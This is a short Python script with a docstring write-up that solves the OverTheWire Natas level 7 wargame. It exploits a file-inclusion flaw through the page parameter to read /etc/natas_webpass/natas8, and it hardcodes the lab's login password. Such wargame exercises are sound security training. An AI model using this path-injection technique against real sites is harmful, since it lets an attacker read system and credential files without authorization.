import requests
import re

name = "natas7"

url = f"http://{name}.natas.labs.overthewire.org?page=/etc/natas_webpass/natas8"
auth = (f"{name}","7z3hEENjQtflzgnT29q7wAvMNfZdh0i9")

session = requests.session()
logon = session.post(url,auth=auth)
regex = re.compile(r'(\w{15,})\n')
try:
    passwd = regex.findall(logon.text)[0]
    print(passwd)
except IndexError:
    ...
    
"""Natas 7

The simple one. After looking at site content I saw some linking to other files.
index.php?page=home and index.php?page=about together with hint which made everything too obvious.
So my first try was to append to my login url ?page=/etc/natas_webpass/natas8 because
same thing was done with those links to Home and About and it worked perfectly, password showed up in no time.

"""
